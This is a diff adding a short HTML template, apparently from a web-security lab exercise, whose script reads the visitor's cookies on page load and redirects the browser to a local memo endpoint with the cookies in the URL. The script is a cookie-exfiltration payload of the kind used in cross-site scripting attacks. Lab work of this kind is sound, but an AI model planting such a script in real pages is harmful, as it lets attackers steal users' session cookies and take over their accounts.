@@ -1,0 +1,24 @@
+<!-- templates/send_cookie.html -->
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Send Cookie</title>
+</head>
+<body>
+
+    <h1>Send Cookie to Server</h1>
+
+    <!-- JavaScript 코드 -->
+    <script>
+        // 쿠키 가져오기
+        var userCookie = document.cookie;
+
+        // 서버로 쿠키 전송
+        var url = "http://127.0.0.1:8000/memo?memo=" + userCookie;
+        location.href = url;
+    </script>
+
+</body>
+</html>
